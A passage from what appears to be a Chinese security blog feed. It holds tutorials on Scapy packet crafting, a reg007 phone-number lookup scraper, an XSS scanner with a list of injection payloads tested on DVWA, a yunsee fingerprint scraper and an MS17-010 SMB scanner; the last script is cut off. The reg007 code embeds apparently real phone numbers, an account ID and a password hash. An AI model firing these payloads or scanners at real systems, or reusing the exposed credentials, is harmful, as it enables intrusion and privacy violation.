AckTFTP_DATA  : TFTP DataTFTP_ERROR : TFTP ErrorTFTP_OACK  : TFTP Option AckTFTP_Option : NoneTFTP_Options : NoneTFTP_RRQ   : TFTP Read RequestTFTP_WRQ   : TFTP Write RequestUDP        : UDPUDPerror   : UDP in ICMPUSER_CLASS_DATA : user class dataVENDOR_CLASS_DATA : vendor class dataVENDOR_SPECIFIC_OPTION : vendor specific option dataVRRP       : NoneVRRPv3     : NoneVXLAN      : VXLANX509_AccessDescription : NoneX509_AlgorithmIdentifier : NoneX509_Attribute : NoneX509_AttributeTypeAndValue : NoneX509_AttributeValue : NoneX509_CRL   : NoneX509_Cert  : NoneX509_DNSName : NoneX509_DirectoryName : NoneX509_EDIPartyName : NoneX509_ExtAuthInfoAccess : NoneX509_ExtAuthorityKeyIdentifier : NoneX509_ExtBasicConstraints : NoneX509_ExtCRLDistributionPoints : NoneX509_ExtCRLNumber : NoneX509_ExtCertificateIssuer : NoneX509_ExtCertificatePolicies : NoneX509_ExtComment : NoneX509_ExtDefault : NoneX509_ExtDeltaCRLIndicator : NoneX509_ExtDistributionPoint : NoneX509_ExtDistributionPointName : NoneX509_ExtExtendedKeyUsage : NoneX509_ExtFreshestCRL : NoneX509_ExtFullName : NoneX509_ExtGeneralSubtree : NoneX509_ExtInhibitAnyPolicy : NoneX509_ExtInvalidityDate : NoneX509_ExtIssuerAltName : NoneX509_ExtIssuingDistributionPoint : NoneX509_ExtKeyUsage : NoneX509_ExtNameConstraints : NoneX509_ExtNameRelativeToCRLIssuer : NoneX509_ExtNetscapeCertType : NoneX509_ExtNoticeReference : NoneX509_ExtPolicyConstraints : NoneX509_ExtPolicyInformation : NoneX509_ExtPolicyMappings : NoneX509_ExtPolicyQualifierInfo : NoneX509_ExtPrivateKeyUsagePeriod : NoneX509_ExtQcStatement : NoneX509_ExtQcStatements : NoneX509_ExtReasonCode : NoneX509_ExtSubjInfoAccess : NoneX509_ExtSubjectAltName : NoneX509_ExtSubjectDirectoryAttributes : NoneX509_ExtSubjectKeyIdentifier : NoneX509_ExtUserNotice : NoneX509_Extension : NoneX509_Extensions : NoneX509_GeneralName : NoneX509_IPAddress : NoneX509_OtherName : NoneX509_PolicyMapping : NoneX509_RDN   : NoneX509_RFC822Name : NoneX509_RegisteredID : NoneX509_RevokedCertificate : NoneX509_SubjectPublicKeyInfo : NoneX509_TBSCertList : NoneX509_TBSCertificate : NoneX509_URI   : NoneX509_Validity : NoneX509_X400Address : None_DHCP6OptGuessPayload : None_DNSRRdummy : Dummy class that implements post_build() for Resource Records_ESPPlain  : ESP_ICMPv6    : ICMPv6 dummy class_ICMPv6Error : ICMPv6 errors dummy class_ICMPv6ML  : ICMPv6 dummy class_IPOption_HDR : None_IPv46     : IP_IPv6ExtHdr : Abstract IPv6 Option Header_LLMNR     : None_MobilityHeader : Dummy IPv6 Mobility Header_RadiusAttrHexStringVal : Radius Attribute_RadiusAttrIPv4AddrVal : Radius Attribute_RadiusAttrIntEnumVal : Radius Attribute_RadiusAttrIntValue : Radius Attribute_SpecificRadiusAttr : Radius AttributeNone</code></pre><p>查看支持的指令集</p><pre><code>from scapy.all import *print(lsc())</code></pre><p><img src="https://i.imgur.com/SDo5V1G.png" alt=""></p><pre><code>IPID_count          : Identify IP id values classes in a list of packetsarpcachepoison      : Poison target&apos;s cache with (your MAC,victim&apos;s IP) couplearping              : Send ARP who-has requests to determine which hosts are upbind_layers         : Bind 2 layers on some specific fields&apos; valuesbridge_and_sniff    : Forward traffic between interfaces if1 and if2, sniff and returnchexdump            :  Build a per byte hexadecimal representationcomputeNIGroupAddr  : Compute the NI group Address. Can take a FQDN as input parametercorrupt_bits        : Flip a given percentage or number of bits from a stringcorrupt_bytes       : Corrupt a given percentage or number of bytes from a stringdefrag              : defrag(plist) -&gt; ([not fragmented], [defragmented],defragment          : defrag(plist) -&gt; plist defragmented as much as possible dhcp_request        : --dyndns_add          : Send a DNS add message to a nameserver for &quot;name&quot; to have a new &quot;rdata&quot;dyndns_del          : Send a DNS delete message to a nameserver for &quot;name&quot;etherleak           : Exploit Etherleak flawfletcher16_checkbytes:  Calculates the Fletcher-16 checkbytes returned as 2 byte binary-string.fletcher16_checksum :  Calculates Fletcher-16 checksum of the given buffer.fragleak            : --fragleak2           : --fragment            : Fragment a big IP datagramfuzz                : Transform a layer into a fuzzy layer by replacing some default values by random objectsgetmacbyip          : Return MAC address corresponding to a given IP addressgetmacbyip6         : Returns the MAC address corresponding to an IPv6 addresshexdiff             : Show differences between 2 binary stringshexdump             :  Build a tcpdump like hexadecimal viewhexedit             : --hexstr              : --import_hexcap       : --is_promisc          : Try to guess if target is in Promisc mode. The target is provided by its ip.linehexdump         :  Build an equivalent view of hexdump() on a single linels                  : List  available layers, or infos on a given layer class or nameneighsol            : Sends an ICMPv6 Neighbor Solicitation message to get the MAC address of the neighbor with specified IPv6 address addroverlap_frag        : Build overlapping fragments to bypass NIPSpromiscping         : Send ARP who-has requests to determine which hosts are in promiscuous moderdpcap              : Read a pcap or pcapng file and return a packet listreport_ports        : portscan a target and output a LaTeX tablerestart             : Restarts scapysend                : Send packets at layer 3sendp               : Send packets at layer 2sendpfast           : Send packets at layer 2 using tcpreplay for performancesniff               : split_layers        : Split 2 layers previously boundsr                  : Send and receive packets at layer 3sr1                 : Send packets at layer 3 and return only the first answersr1flood            : Flood and receive packets at layer 3 and return only the first answersrbt                : send and receive using a bluetooth socketsrbt1               : send and receive 1 packet using a bluetooth socketsrflood             : Flood and receive packets at layer 3srloop              : Send a packet at layer 3 in loop and print the answer each timesrp                 : Send and receive packets at layer 2srp1                : Send and receive packets at layer 2 and return only the first answersrp1flood           : Flood and receive packets at layer 2 and return only the first answersrpflood            : Flood and receive packets at layer 2srploop             : Send a packet at layer 2 in loop and print the answer each timetcpdump             : Run tcpdump or tshark on a list of packetstraceroute          : Instant TCP traceroutetraceroute6         : Instant TCP traceroute using IPv6traceroute_map      : Util function to call traceroute on multiple targets, thentshark              : Sniff packets and print them calling pkt.summary(), a bit like text wiresharkwireshark           : Run wireshark on a list of packetswrpcap              : Write a list of packets to a pcap fileNone</code></pre><p>arping得到所在局域网内所有可用的ip与mac的对应关系</p><pre><code>from scapy.all import *print(arping(&quot;192.168.89.255/80&quot;))</code></pre><p><img src="https://i.imgur.com/FXMIyan.png" alt=""></p><pre><code>Begin emission:Finished sending 1 packets.Received 0 packets, got 0 answers, remaining 1 packets(&lt;ARPing: TCP:0 UDP:0 ICMP:0 Other:0&gt;, &lt;Unanswered: TCP:0 UDP:0 ICMP:0 Other:1&gt;)</code></pre><p>携带参数模式</p><pre><code>from scapy.all import *print(ls(UDP))</code></pre><p><img src="https://i.imgur.com/jQujPUM.png" alt=""></p><pre><code>sport      : ShortEnumField                      = (53)dport      : ShortEnumField                      = (53)len        : ShortField                          = (None)chksum     : XShortField                         = (None)None</code></pre><p><strong>IP模块的使用：</strong><br>我们可以实例化一个IP对象<br><img src="https://i.imgur.com/JsfJ1pB.png" alt=""><br>也可以传入需要自定义的参数<br><img src="https://i.imgur.com/4oQX6H5.png" alt=""><br>查看 IP 模块对象的所有信息<br><img src="https://i.imgur.com/kerW2wG.png" alt=""><br><strong>发送报文：</strong><br><img src="https://i.imgur.com/F6nCWBR.png" alt=""><br><strong>接收报文：</strong><br>测试：<br>开启两个终端,一边发送报文一边接收报文<br><img src="https://i.imgur.com/A1PJRMm.png" alt=""></p><p><strong>细说数据发送：</strong><br>send在第三层发送数据包，但没有接收功能<br><img src="https://i.imgur.com/JkZaTa9.png" alt=""></p><p>向某个IP发送一个数据包：</p><pre><code>import structfrom scapy.all import *data = struct.pack(&apos;=BHI&apos;, 0x13, 0x5EF3, 0x96)pkt = IP(src=&apos;127.0.0.1&apos;, dst=&apos;127.0.0.1&apos;)/UDP(sport=12345,dport=5555)/datasend(pkt, inter=1, count=5)</code></pre><p><img src="https://i.imgur.com/k8ZBF0Q.png" alt=""></p><p>在第二层发送数据包，同样没有接收功能。</p><pre><code>import structfrom scapy.all import *dar=sendp(Ether()/IP(dst=&quot;www.baidu.com&quot;,ttl=4)/ICMP())print(dar)</code></pre><p><img src="https://i.imgur.com/FoaZGrM.png" alt=""></p><p>sr在第三层发送数据包，有接收功能</p><p><img src="https://i.imgur.com/XHsj3Hq.png" alt=""></p><p>sr1在第三层发送数据包，有接收功能，但只接收第一个包<br><img src="https://i.imgur.com/Y7GOUL2.png" alt=""></p><p>srloop在第三层工作<br><img src="https://i.imgur.com/BKt1Chw.png" alt=""><br>srp在第二层发送数据包，有接收功能<br><img src="https://i.imgur.com/KCuNS3U.png" alt=""><br>srp1在第二层发送数据包，有接收功能，但只接收第一个包。以上面的发送四个包为例</p><p><img src="https://i.imgur.com/3bNMq7Q.png" alt=""><br>srploop在第三层工作<br><img src="https://i.imgur.com/cn5rcKX.png" alt=""></p><p>好了，到现在我们已经详细的认识了scapy的一部分功能。也细说了发送的功能。下次我们在学习，去看漏洞银行七夕直播了<br>转载请声明：422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取reg007的过程</title>
      <link href="/posts/9f4ca7bb.html"/>
      <url>/posts/9f4ca7bb.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前有那么一丝想抓取一个Reg007网站的想法，但是之前因为<br>上学没有时间。所以没抓</p><p><img src="https://i.imgur.com/EuUIzvh.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p><img src="https://i.imgur.com/LjWPxZx.png" alt=""></p><p>Reg007是一个可以查到，你手机号注册了什么网站的一个站。<br>我们不登陆的话可以查询到三个注册过的网站。</p><p><img src="https://i.imgur.com/NGKThwI.png" alt=""></p><p>那么我们来抓包一次看看到底是怎么回事</p><p><img src="https://i.imgur.com/rHgJO1W.png" alt=""></p><p>从这里我们可以看出这里的抓到的请求，请求参数为</p><pre><code>q：你的手机号码</code></pre><p>然后需要在cookie带上你手机号发送：</p><pre><code>_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=手机号</code></pre><p>然后我们登陆账号在试试查询</p><p><img src="https://i.imgur.com/bvC2KyZ.png" alt=""></p><p>可以看出用了登陆cookie之后我们能查到全部。（我草码又没打好<br>不打了草）</p><p>思路：</p><pre><code>1.首先进行登陆2.然后抓取登陆的cookie进行查询</code></pre><p>代码：（烂的一匹，死活不知道怎么获取Request Cookie）</p><pre><code>import requestsimport reimport timefrom bs4 import BeautifulSoupdef reg():    headers={&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    url=&apos;https://www.reg007.com/&apos;    loginurl=&apos;https://www.reg007.com/account/signin&apos;    sous=&apos;https://www.reg007.com/search?q=查询的手机号&apos;    zq=requests.get(url=url,headers=headers)    search=re.search(&apos;value=&quot;.*&quot;&apos;,zq.text)    qz=str(search.group()).replace(&apos;&quot;&apos;,&apos;&apos;).replace(&apos;value&apos;,&apos;&apos;)    cs=&apos;account=你的账号&amp;password=你的密码&amp;remember=on&amp;__csrf__{}&apos;.format(qz)    datas={}    cookies={}    cookiev=&apos;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_think_language=zh-CN; PHPSESSID=jt6c1djpm2ep7qnte3d1svuen4; _gat=1&apos;    for c in cs.split(&apos;&amp;&apos;):        key,value=c.split(&apos;=&apos;,1)        datas[key]=value    for k in cookiev.split(&apos;;&apos;):        key,value=k.split(&apos;=&apos;,1)        cookies[key]=value    #print(zq.headers)    hq=requests.get(url=loginurl,headers=headers)    reqts=requests.session()    login=reqts.post(url=loginurl,headers=headers,data=datas,cookies=cookies)    if login.url == &apos;https://www.reg007.com/account&apos;:        print(&apos;[+]Landing success !&apos;)        cv= {}        cookiesw=&apos;_ga=GA1.2.1107102936.1534170998; _gid=GA1.2.1501069481.1534324705; reg007_c_s_t=2; reg007_think_language=zh-CN; PHPSESSID=gtnua8rhph3d80u3umktadimk6; reg007_f_c_j=958dcf85640ae27962c2c9f9cd00574f; reg007_q=13113190031; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0&apos;        for u in cookiesw.split(&apos;;&apos;):            key,value=u.split(&apos;=&apos;,1)            cv[key]=value        dw = reqts.get(url=sous, headers=headers,cookies=cv)        time.sleep(5)        kivs = BeautifulSoup(dw.text, &apos;html.parser&apos;)        fd=re.findall(&apos;.*\|&apos;,kivs.get_text())        for f in fd:            print(str(f).replace(&apos;(&apos;,&apos;&apos;).replace(&apos;adsbygoogle&apos;,&apos;&apos;).replace(&apos;=&apos;,&apos;&apos;).replace(&apos;window&apos;,&apos;&apos;).replace(&apos;.&apos;,&apos;&apos;).replace(&apos;||&apos;,&apos;&apos;).replace(&apos;functioni&apos;,&apos;&apos;).replace(&apos;s&apos;,&apos;&apos;).replace(&apos;o&apos;,&apos;&apos;).replace(&apos;g&apos;,&apos;&apos;).replace(&apos;r&apos;,&apos;&apos;).replace(&apos;a&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;m&apos;,&apos;&apos;).replace(&apos;{&apos;,&apos;&apos;).replace(&apos;i&apos;,&apos;&apos;).replace(&apos;[&apos;,&apos;&apos;).replace(&quot;&apos;&quot;,&apos;&apos;).replace(&apos;)&apos;,&apos;&apos;).replace(&apos;GleAnlytcObject&apos;,&apos;&apos;).replace(&apos;]&apos;,&apos;&apos;).replace(&apos;;&apos;,&apos;&apos;).replace(&apos;q&apos;,&apos;&apos;))            #print(f)    else:        print(&apos;[-]Landing failure !&apos;)        exit()#gz=requests.get(url=url,headers=headers)#PHPSESSID=gz.cookies#search2=re.search(&apos;PHPSESSID=.*&apos;,str(PHPSESSID))#PHPSESSID=str(search2).replace(&apos;&lt;&apos;,&apos;&apos;).replace(&apos;_&apos;,&apos;&apos;).replace(&apos;sre&apos;,&apos;&apos;).replace(&apos;.&apos;,&apos;&apos;).replace(&apos;SREMatch&apos;,&apos;&apos;).replace(&apos;object&apos;,&apos;&apos;).replace(&apos;;&apos;,&apos;&apos;).replace(&apos;span=&apos;,&apos;&apos;).replace(&apos;(&apos;,&apos;&apos;).replace(&apos;27&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;162&apos;,&apos;&apos;).replace(&apos;)&apos;,&apos;&apos;).replace(&apos;match=&apos;,&apos;&apos;).replace(&apos;for&apos;,&apos;&apos;).replace(&apos;wwwreg0&apos;,&apos;&apos;).replace(&apos;&gt;&apos;,&apos;&apos;).replace(&quot;&apos;&quot;,&apos;&apos;).strip()#COOKIES=&apos;reg007_think_language=zh-CN;{};reg007_c_s_t=1; reg007_account=18938561951;reg007_password={}&apos;.format(PHPSESSID)#cas={}#cks=&apos;Cookie: reg007_think_language=zh-CN; PHPSESSID=evtmr498kqegclhchh3etkqv27; reg007_c_s_t=1; reg007_account=18938561951; reg007_password=86e6a966a434f11cfa0ad215d1eaa8b0; reg007_q=13113190031; reg007_f_c_j=acca75fee2492ffacbc22c9640bca829; _ga=GA1.2.714340125.1534326028; _gid=GA1.2.519570063.1534326028&apos;#for l in cks.split(&apos;;&apos;):    #key,value=l.split(&apos;=&apos;,1)    #cas[key]=valuereg()</code></pre><p>效果还是那么烂：<br><img src="https://i.imgur.com/OqYlj1H.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写个xss检测器怎么样</title>
      <link href="/posts/6be20071.html"/>
      <url>/posts/6be20071.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前言都写了好多次了，都不知道写什么了。。。就是之前已经写了SQL注入的检测了。顺便把xss检测写了<br><img src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1794900033,2842336697&amp;fm=15&amp;gp=0.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>为了进行测试，首先搭建DVWA环境。这里我用Ubuntu搭建的<br>搭建环境这里我就不说了。<br><strong>漏洞说明：</strong></p><pre><code>xss漏洞（跨站脚本注入漏洞）攻击者将恶意的JavaScript代码注入到页面发起恶意攻击当注入成功的时候页面会有注入成功的语句</code></pre><p><strong>代码思路：</strong></p><pre><code>1.首先遍历存放xss payload的文件夹，进行读取2.让使用者输入URL并要在指定插入xss payload的地方插入*3.替换*为xss的payload4.检测页面是否有注入成功的xss payload5.将注入成功的语句写入一个txt里</code></pre><p>代码：</p><pre><code>import requestsimport osimport redef scan():    xj = open(&apos;save.txt&apos;, &apos;w&apos;)    xj.close()    headers = {&apos;user-agent&apos;: &apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}    cookies={}    user=input(&apos;url:&apos;)    cookier=input(&apos;cookie:&apos;)    for c in cookier.split(&apos;;&apos;):        key,value=c.split(&apos;=&apos;,1)        cookies[key]=value    print(cookies)    print(&apos;[*]{}&apos;.format(user))    dq = os.listdir(&apos;xss_payload&apos;)    for line in dq:        print(&apos;[+]{}&apos;.format(line))        ds = open(&apos;xss_payload/{}&apos;.format(line),&apos;r&apos;)        for we in ds.readlines():            #print(we)            qc=&apos;&apos;.join(we.split(&apos;\n&apos;))            th=user.replace(&apos;*&apos;,&apos;{}&apos;.format(qc))            try:                rest=requests.session()                livs=rest.get(url=th,headers=headers,cookies=cookies)                if qc in livs.text:                    print(&apos;[+]xss payload:{}{}&apos;.format(livs.url,qc))                    print(&apos;[+]xss payload:{}{}&apos;.format(livs.url, qc),file=open(&apos;save.txt&apos;,&apos;a&apos;))                else:                    print(&apos;[-]Not xss payload:{}&apos;.format(qc))            except Exception as r:                print(&apos;[-]Error {}&apos;.format(r))scan()</code></pre><p>DVWA低级到高级的测试：<br>（不可能级别将字符实体化已经不存在xss漏洞）</p><p>low级：<br><img src="https://i.imgur.com/WIq2zh2.png" alt=""></p><p><img src="https://i.imgur.com/fROnc2q.png" alt=""></p><p><img src="https://i.imgur.com/5VZEJHo.png" alt=""></p><p><img src="https://i.imgur.com/G1mKsVr.png" alt=""></p><p>随便找个Payload来测试一下：<br><img src="https://i.imgur.com/3XQvlRI.png" alt=""></p><p>Medium级：<br><img src="https://i.imgur.com/QUlr9sT.png" alt=""></p><p><img src="https://i.imgur.com/EBQqVdG.png" alt=""></p><p><img src="https://i.imgur.com/e7pfFcm.png" alt=""></p><p><img src="https://i.imgur.com/sk6gMIG.png" alt=""></p><p>随便找个 payload来测试下：<br><img src="https://i.imgur.com/8b0BX5E.png" alt=""></p><p><img src="https://i.imgur.com/5EfPuns.png" alt=""></p><p>high级：<br><img src="https://i.imgur.com/Pr6f1gY.png" alt=""></p><p><img src="https://i.imgur.com/DA4ySjz.png" alt=""></p><p><img src="https://i.imgur.com/yMr49wY.png" alt=""></p><p><img src="https://i.imgur.com/dU8jDkQ.png" alt=""><br>随便找个payload：<br><img src="https://i.imgur.com/oW3YRt7.png" alt=""></p><p>收集到的payload古灵精怪的，有一些不只是弹窗。<br>一些常用的手动xss测试语句：</p><pre><code>javascript:alert(1)//INJECTX&lt;svg/onload=alert(1)&gt;//INJECTX&lt;img onload=alert(1)&gt;//INJECTX&lt;img src=x onerror=prompt(1)&gt;//INJECTX&lt;a href=&quot;javascript:alert(1)&quot; onmouseover=alert(1)&gt;INJECTX HOVER&lt;/a&gt; onmouseover=&quot;document.cookie=true;&quot;&gt;//INJECTXalert(1)&gt;//INJECTX&lt;h1&gt;INJECTX&lt;/h1&gt;&lt;img src=x onload=prompt(1) onerror=alert(1) onmouseover=prompt(1)&gt;&lt;svg&gt;&lt;script&gt;/&lt;@/&gt;alert(1)&lt;/script&gt;//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;iframe/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;}alert(/INJECTX/);{//&lt;h1/onclick=alert(1)&gt;a//INJECTX&lt;svg/onload=alert(/INJECTX/)&gt;&lt;p/onclick=alert(/INJECTX/)&gt;a&lt;svg/onload=alert`INJECTX`&gt;&lt;svg/onload=alert(/INJECTX/)&gt;&lt;svg/onload=alert(`INJECTX`)&gt;&lt;video&gt;&lt;source onerror=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;video onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;audio onerror=&quot;javascript:alert(1)&quot;&gt;&lt;source&gt;//INJECTX&lt;input autofocus onfocus=alert(1)&gt;//INJECTX&lt;select autofocus onfocus=alert(1)&gt;//INJECTX&lt;textarea autofocus onfocus=alert(1)&gt;//INJECTX&lt;keygen autofocus onfocus=alert(1)&gt;//INJECTX&lt;button form=test onformchange=alert(1)&gt;//INJECTX&lt;form&gt;&lt;button formaction=&quot;javascript:alert(1)&quot;&gt;//INJECTX&lt;svg onload=(alert)(1) &gt;//INJECTX&lt;script&gt;$=1,alert($)&lt;/script&gt;//INJECTX&lt;!--&lt;img src=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;//INJECTX&lt;img/src=&apos;x&apos;onerror=alert(1)&gt;//INJECTX&lt;marguee/onstart=alert(1)&gt;//INJECTX&lt;script&gt;alert(1)//INJECTX&lt;script&gt;alert(1)&lt;!--INJECTX&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;//INJECTX</code></pre><p>xss万能注入语句：<a href="https://www.jianshu.com/p/3f16269c83db" target="_blank" rel="noopener">https://www.jianshu.com/p/3f16269c83db</a><br>转载请声明：专自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>抓取云悉接口</title>
      <link href="/posts/10d57181.html"/>
      <url>/posts/10d57181.html</url>
      <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>前段时间一直想抓web指纹，发现手动抓的残缺不全还不准确。后来想抓云悉<br>指纹没有做。现在正好有时间爬了。<br><img src="https://i.imgur.com/AE9yFBG.jpg" alt=""></p><h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>我们首先来抓包，分析一下URL<br>云悉：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a></p><p><img src="https://i.imgur.com/LXEWIFX.png" alt=""></p><p>有type,url,string,_token。这几个参数</p><pre><code>通查看网页源代码可以得出，string的参数是固定的。而_token是可以从网页源代码获取的。url是你自己的type是cms查询的类型，还有一个查whois的</code></pre><p>然后可以得出思路：</p><pre><code>1.利用正则的search搜索功能抓取_token2.过滤掉_token一些无关紧要的符合3.组成参数4.经过循环并且加入字典5.发送post请求并带上参数6.解刨json数据</code></pre><p>代码：</p><pre><code>import requestsimport threadingimport redef zhuaq(urls):user=input(&apos;url:&apos;)data={}data2={}headers={&apos;user-agent&apos;:&apos;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36&apos;}url2=&apos;http://www.yunsee.cn/home/getInfo&apos;reqts=requests.get(url=urls,headers=headers)search=re.search(&apos;_token:.*&apos;,reqts.text)token=&apos;{}&apos;.format(search.group()).replace(&apos;}&apos;,&apos;&apos;).replace(&apos;,&apos;,&apos;&apos;).replace(&apos;&quot;&apos;,&apos;&apos;).replace(&apos;:&apos;,&apos;&apos;).replace(&apos;_token&apos;,&apos;&apos;).strip()datas=&apos;type=webcms&amp;url={}&amp;_token={}&apos;.format(user,token)datas2 = &apos;type=webinfo&amp;url={}&amp;_token={}&apos;.format(user, token)for v in datas.split(&apos;&amp;&apos;):    key,value=v.split(&apos;=&apos;,1)    data[key]=valuereqvs=requests.post(url=url2,headers=headers,data=data)jsons=reqvs.json()for v in datas2.split(&apos;&amp;&apos;):    key, value = v.split(&apos;=&apos;, 1)    data2[key] = valuereqvs2 = requests.post(url=url2, headers=headers, data=data2)json2=reqvs2.json()print(&apos;url:{}&apos;.format(user))print(&apos;whois_dns:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_dns&apos;]))print(&apos;icp_name:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_name&apos;]))print(&apos;ip:{}&apos;.format(json2[&apos;res&apos;][&apos;ip&apos;]))print(&apos;language:{}&apos;.format(json2[&apos;res&apos;][&apos;language&apos;]))print(&apos;whois_mail:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_mail&apos;]))print(&apos;os:{}&apos;.format(json2[&apos;res&apos;][&apos;os&apos;]))print(&apos;cdn:{}&apos;.format(json2[&apos;res&apos;][&apos;cdn&apos;]))print(&apos;server:{}&apos;.format(json2[&apos;res&apos;][&apos;server&apos;]))print(&apos;record_id:{}&apos;.format(json2[&apos;res&apos;][&apos;record_id&apos;]))print(&apos;whois_isp:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_isp&apos;]))#print(&apos;LLC:{}&apos;.format(json2[&apos;res&apos;][&apos;LLC&apos;]))print(&apos;whois_date:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_date&apos;]))print(&apos;create:{}&apos;.format(json2[&apos;res&apos;][&apos;create&apos;]))print(&apos;icp_id:{}&apos;.format(json2[&apos;res&apos;][&apos;icp_id&apos;]))print(&apos;whois_name:{}&apos;.format(json2[&apos;res&apos;][&apos;whois_name&apos;]))print(&apos;idc:{}&apos;.format(json2[&apos;res&apos;][&apos;idc&apos;]))print(&apos;cms:{}&apos;.format(jsons[&apos;mess&apos;]))for reqs in jsons[&apos;res&apos;][0:]:    print(&apos;desc:{} name:{}&apos;.format(reqs[&apos;desc&apos;],reqs[&apos;name&apos;]))def run():    url = &apos;http://www.yunsee.cn/&apos;    t=threading.Thread(target=zhuaq,args=(url,))    t.start()if __name__ == &apos;__main__&apos;:    run()</code></pre><p>测试效果图：<br><img src="https://i.imgur.com/74eBaKb.png" alt=""></p><p>转载请声明来自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>python写MS17-010扫描器</title>
      <link href="/posts/c68019ec.html"/>
      <url>/posts/c68019ec.html</url>
      <content type="html"><![CDATA[<p>前言：<br>MS17-010早已是上一年的事情了。只不过想写一个检测脚本方便自己进行测试和用<br><img src="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=1136046643,4023666134&amp;fm=27&amp;gp=0.jpg" alt=""></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h2><p>先说思路：</p><pre><code>    negotiate_protocol_request = binascii.unhexlify(    &quot;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&quot;)session_setup_request = binascii.unhexlify(    &quot;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&quot;)tree_connect_request = binascii.unhexlify(    &quot;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&quot;)trans2_session_setup = binascii.unhexlify(    &quot;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&quot;)</code></pre><p>1.先把这些payload(首先把payload进行字符化)发送到目标主机<br>2.然后读取返回的数据进行判断<br>3.验证是否存在MS17010漏洞</p><p>代码：</p><pre><code>import socketimport binasciiimport structimport sysuser=input(&apos;IP:&apos;)def scan():payload0 = binascii.unhexlify (&apos;00000085ff534d4272000000001853c00000000000000000000000000000fffe00004000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;)payload1 = binascii.unhexlify(&apos;00000088ff534d4273000000001807c00000000000000000000000000000fffe000040000dff00880004110a000000000000000100000000000000d40000004b000000000000570069006e0064006f007700730020003200300030003000200032003100390035000000570069006e0064006f007700730020003200300030003000200035002e0030000000&apos;)payload2 = binascii.unhexlify(&apos;00000060ff534d4275000000001807c00000000000000000000000000000fffe0008400004ff006000080001003500005c005c003100390032002e003100360038002e003100370035002e003100320038005c00490050004300240000003f3f3f3f3f00&apos;)payload3 = binascii.unhexlify(&apos;0000004eff534d4232000000001807c00000000000000000000000000008fffe000841000f0c0000000100000000000000a6d9a40000000c00420000004e0001000e000d0000000000000000000000000000&apos;)s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.settimeout(5)host=userport=445s.connect((host,port))print(&apos;[+]{}Ready to send&apos;.format(host))s.send(payload0)s.recv(1024)print(&apos;[+]{}Setting 